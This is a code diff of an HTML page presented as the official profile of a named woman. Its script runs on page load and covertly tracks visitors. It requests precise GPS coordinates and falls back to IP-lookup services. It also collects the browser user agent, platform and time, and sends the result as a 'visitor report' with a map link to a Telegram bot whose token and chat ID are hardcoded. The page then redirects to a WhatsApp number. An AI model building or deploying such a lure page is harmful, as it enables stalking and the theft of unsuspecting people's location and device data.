@@ -4,110 +4,132 @@
   <meta charset="UTF-8">
   <title>هند العزاوي - الصفحة الرسمية</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      padding: 0;
-    }
-    .card {
-      background: white;
-      border-radius: 15px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      padding: 30px;
-      text-align: center;
-      max-width: 400px;
-      width: 90%;
-    }
-    .avatar {
-      width: 150px;
-      height: 150px;
-      border-radius: 50%;
-      object-fit: cover;
-      margin-bottom: 20px;
-      border: 3px solid #ff6b6b;
-    }
-    h2 {
-      color: #333;
-      margin: 10px 0;
-    }
-    p {
-      color: #666;
-      margin: 5px 0;
-    }
-    .loader {
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #ff6b6b;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 2s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+    /* نفس الأنماط السابقة... */
   </style>
   <script>
     // إعدادات التلجرام
     const BOT_TOKEN = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
     const CHAT_ID = '7493001551';
 
-    // دالة لإرسال الرسالة إلى التلجرام
-    function sendToTelegram(message) {
+    // دالة إرسال إلى التلجرام
+    async function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      });
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+      }
     }
 
-    // تسجيل بيانات الزائر وإرسالها إلى التلجرام
-    fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
-        const city = data.city || 'غير معروف';
-        const region = data.region || 'غير معروف';
-        const country = data.country_name || 'غير معروف';
-        const loc = data.latitude + ',' + data.longitude;
-        const googleMapsLink = `https://www.google.com/maps?q=${loc}`;
-        const isp = data.org || 'غير معروف';
-        
-        const message = `🕵️‍♂️ زائر جديد للصفحة:
-        
-🌐 IP: ${ip}
-🏙️ المدينة: ${city}
-📍 المنطقة: ${region}
-🌍 الدولة: ${country}
-📡 مزود الخدمة: ${isp}
-🗺️ الموقع على الخريطة:
-${googleMapsLink}`;
+    // تحديد الموقع بثلاث طرق مختلفة للدقة
+    async function trackVisitor() {
+      let locationData = {
+        ip: 'غير معروف',
+        city: 'غير معروف',
+        country: 'غير معروف',
+        method: 'غير معروف'
+      };
 
-        sendToTelegram(message);
-        
-        // إرسال البيانات إلى ملف log.php (اختياري)
-        fetch('log.php', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify(data)
-        });
-      })
-      .catch(error => {
-        console.error('Error fetching location:', error);
-        sendToTelegram('❌ فشل في جلب بيانات الموقع: ' + error.message);
-      });
+      // الطريقة 1: GPS للمتصفح (الأدق لكن يحتاج إذن)
+      if (navigator.geolocation) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 5000,
+              maximumAge: 0
+            });
+          });
+          
+          locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy + ' متر',
+            method: 'GPS'
+          };
+          
+        } catch (gpsError) {
+          console.log('GPS Error:', gpsError);
+        }
+      }
 
-    // تحويل تلقائي إلى واتساب بعد 5 ثواني
+      // الطريقة 2: استخدام IPAPI مع خادم سوري
+      if (locationData.method === 'غير معروف') {
+        try {
+          const response = await fetch('https://sy.ip-api.com/json/');
+          const data = await response.json();
+          
+          locationData = {
+            ip: data.query,
+            city: data.city || 'غير معروف',
+            region: data.regionName || 'غير معروف',
+            country: data.country || 'غير معروف',
+            isp: data.isp || 'غير معروف',
+            method: 'IPAPI-SY'
+          };
+          
+        } catch (ipError) {
+          console.log('IPAPI Error:', ipError);
+        }
+      }
+
+      // الطريقة 3: استخدام خدمة احتياطية
+      if (locationData.method === 'غير معروف') {
+        try {
+          const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN');
+          const data = await response.json();
+          
+          locationData = {
+            ip: data.ip,
+            city: data.city || 'غير معروف',
+            region: data.region || 'غير معروف',
+            country: data.country || 'غير معروف',
+            isp: data.org || 'غير معروف',
+            method: 'IPINFO'
+          };
+          
+        } catch (fallbackError) {
+          console.log('Fallback Error:', fallbackError);
+        }
+      }
+
+      // إعداد رسالة التقرير
+      let message = '🕵️‍♂️ تقرير الزائر:\n\n';
+      
+      if (locationData.latitude) {
+        const mapsLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+        message += `📍 الموقع الدقيق:\n${mapsLink}\n(دقة: ${locationData.accuracy})\n`;
+        message += `⚙️ الطريقة: ${locationData.method}\n`;
+      } else {
+        message += `🌐 IP: ${locationData.ip}\n`;
+        message += `🏙️ المدينة: ${locationData.city}\n`;
+        message += `📍 المنطقة: ${locationData.region}\n`;
+        message += `🌍 الدولة: ${locationData.country}\n`;
+        message += `📡 مزود الخدمة: ${locationData.isp}\n`;
+        message += `⚙️ الطريقة: ${locationData.method}\n`;
+        message += `⚠️ ملاحظة: هذا موقع تقريبي بناءً على IP\n`;
+      }
+
+      // إضافة معلومات المتصفح
+      message += `\n🔍 معلومات إضافية:\n`;
+      message += `🌐 المتصفح: ${navigator.userAgent}\n`;
+      message += `🖥 نظام التشغيل: ${navigator.platform}\n`;
+      message += `🕒 الوقت: ${new Date().toLocaleString('ar-SY')}\n`;
+
+      await sendToTelegram(message);
+    }
+
+    // بدء التتبع عند تحميل الصفحة
+    trackVisitor();
+
+    // التحويل إلى واتساب بعد 5 ثوان
     setTimeout(() => {
       window.location.href = "https://wa.me/963943820819?text=مرحبا";
     }, 5000);
